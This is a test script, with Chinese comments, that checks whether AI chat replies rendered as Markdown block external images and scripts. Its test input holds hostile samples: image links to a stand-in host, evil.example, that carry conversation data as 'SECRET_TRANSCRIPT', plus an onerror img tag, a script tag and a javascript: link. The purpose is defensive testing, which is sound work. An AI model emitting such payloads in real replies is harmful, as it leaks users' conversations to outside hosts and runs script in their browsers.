/**
 * AI 回复的 Markdown 渲染：安全性与基本功能。真的渲染（streamdown + react-dom/server），
 * 不是只检查配置对象。
 *
 *   node scripts/test-markdown.mjs
 */
import React from 'react';
import { renderToString } from 'react-dom/server';
import { Streamdown } from 'streamdown';
import { SAFE_COMPONENTS } from '../components/chat/markdownSafe.ts';

let failures = 0;
function check(label, ok, detail) {
  if (!ok) failures++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${!ok && detail !== undefined ? '  ' + String(detail).slice(0, 300) : ''}`);
}

const render = (md, mode, components = SAFE_COMPONENTS) =>
  renderToString(React.createElement(Streamdown, { mode, isAnimating: mode === 'streaming', components }, md));

const attack = [
  '正常文字',
  '![x](https://evil.example/collect?d=SECRET_TRANSCRIPT)',
  '![](//evil.example/protocol-relative.png)',
  '![ref][r]\n\n[r]: https://evil.example/by-reference.png',
  '<img src="https://evil.example/raw.png" onerror="alert(1)">',
  '<script>alert(1)</script>',
  '[js](javascript:alert(1))',
  '[点我](https://example.com/page)',
].join('\n\n');

for (const mode of ['static', 'streaming']) {
  const html = render(attack, mode);
  check(`[${mode}] 没有任何 <img>（Markdown 图片、引用式图片、原始 HTML 图片）`, !/<img/i.test(html), html.match(/<img[^>]*>/i)?.[0]);
  check(`[${mode}] 页面里没有指向外部主机的自动加载（src / srcset / url()）`,
    !/(src|srcset)="[^"]*evil\.example/i.test(html) && !/url\([^)]*evil\.example/i.test(html));
  check(`[${mode}] 脚本 / onerror / javascript: 被过滤`, !/<script|onerror|href="javascript:/i.test(html));
  check(`[${mode}] 正常文字照常显示`, html.includes('正常文字'));
}

// 对照：不加拦截时图片确实会渲染 —— 证明上面的断言是有力的（拦截是我们这一行起的作用）
const unguarded = render('![x](https://evil.example/collect?d=SECRET)', 'static', {});
check('对照：不加 SAFE_COMPONENTS 时，同一段 Markdown 会渲染出带外部 src 的 <img>', /<img[^>]+src="https:\/\/evil\.example/.test(unguarded), unguarded);

// 功能没被拦坏
const rich = render('**加粗**\n\n- 一\n- 二\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n`code`', 'static');
// streamdown 用 data-streamdown 标记元素，而不是裸标签
for (const [name, part] of [['粗体', 'data-streamdown="strong"'], ['列表', 'data-streamdown="unordered-list"'],
  ['表格', 'data-streamdown="table'], ['行内代码', 'data-streamdown="inline-code"']]) {
  check(`${name}仍然正常渲染`, rich.includes(part), part);
}
check('链接保留可见文字', /点我/.test(render('[点我](https://example.com/page)', 'static')));

const half = render('| a | b |\n|---|---|\n| 1 ', 'streaming');
check('流式：写了一半的表格不会让渲染抛错、已有内容还在', half.includes('a'), half.slice(0, 200));

console.log(failures === 0 ? '\n合计 全部通过' : `\n合计 ${failures} 项失败`);
process.exit(failures === 0 ? 0 : 1);
